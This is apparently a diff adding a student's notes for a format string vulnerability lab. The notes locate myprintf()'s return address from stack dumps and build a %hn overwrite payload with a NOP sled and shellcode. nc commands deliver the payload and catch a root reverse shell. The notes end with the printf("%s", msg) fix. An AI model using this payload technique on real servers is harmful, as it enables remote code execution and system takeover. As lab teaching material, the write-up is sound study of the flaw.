@@ -151,7 +151,45 @@
     ```
 
 ## Task 4: Inject Malicious Code into the Server Program
+- inject malicious code in binary format into the server's memory, and use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code
+- first, we need to know the address of the return address of `myprintf()`, it's `0xffffd16c`, there are 2 approaches to figure it out
+    - approach 1
+        - for `myprintf()`, the return address is pushed to the stack after the argument `msg` is pushed to the stack, and `msg` is the address of the input buffer `0xffffd240`, we can find multiple `0xffffd240` in the printout of the server in task `2.A`
+        - the printout (I removed the first 4 bytes)
+            ```
+            11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc 77777777
+            ```
+        - analysis: there are several places that `0xffffd240` will be push to the stack
+            - `main()` (3): as the argument of `printf()`, `fread()`, and `dummy()`
+            - `dummy()`(1): as the argument of `myprintf()`
+            - `myprintf()` (1): as the argument of `printf()`
+        - the values are printed out from low to high addresses, so the second `0xffffd240` is the argument of `myprintf`, and the return address is `0x08049f7e`
+        - from the printout we can calculate the distance between the second `0x08049f7e` and the address of input buffer, and then we can calculate the address of the return address: `0xffffd240-(4*53)=0xffffd16c`
+    - approach 2 (easier, but require that the server prints out the value of `ebp` inside `myprintf()`)
+        - the value of `ebp` is printed out by the server (it's `0xffffd168`), the return address should be `$ebp+4=0xffffd16c`
+
+- then construct the payload, reuse the payload in task `3.C`, and append the shellcode, for convenience, put the shellcode in the final part of the payload (`[1500-len(shellcode), 1500]`), and the new return address can be `0xffffd240 + (1500-len(shellcode))`, it's ok to return to some bytes before this address, because we will fill those area with NOPs (`0x90`), here I used `0xffffd240+1000=0xffffd628`
+    - we need to modify the value at address `0xffffd16c` to `0xffffd628`, specifically, modify the higher 2 bytes to `0xffff`, and the lower 2 bytes to `0xd628`
+    - the core payload is 
+        1. `0xffffd16c`
+        2. `0x11111111` (padding, can be of any value)
+        3. `0xffffd16c`
+        4. `"%.8x"*62 + "%.54316x%hn%.10711x%hn"`
+            - `54316 = 0xd628 - (62*8 + 3*4)`
+            - `10711 = 0xffff - 0xd628`
+- result
+    ```
+    $ ./exp32.py
+    $ cat badfile | nc 10.9.0.1 9090
+    ```
+    ```
+    $ nc -l 9875
+    root@f83d0236bd7f:/fmt# <---- get a root shell
+    ```
 
 ## Task 5: Attacking the 64-bit Server Program
+- it would be more complex to modify a 64-bit value, but we can still do it with four `%hn`
+
 
 ## Task 6: Fixing the Problem
+- a straight forward fix for the problem is to modify `printf(msg)` to `printf("%s", msg)`
